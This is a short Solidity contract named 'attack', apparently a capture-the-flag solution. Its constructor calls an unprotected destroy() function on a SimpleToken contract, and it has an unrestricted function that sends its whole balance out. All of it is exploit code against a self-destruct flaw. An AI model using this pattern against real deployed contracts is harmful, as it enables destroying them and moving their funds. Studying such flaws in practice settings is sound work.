contract attack {

  constructor(SimpleToken _address) {
    _address.destroy( payable(_address));
  }

  function withdrawn(address payable _to) payable public {
    _to.transfer(address(this).balance);
  }

  receive() external payable{}
}
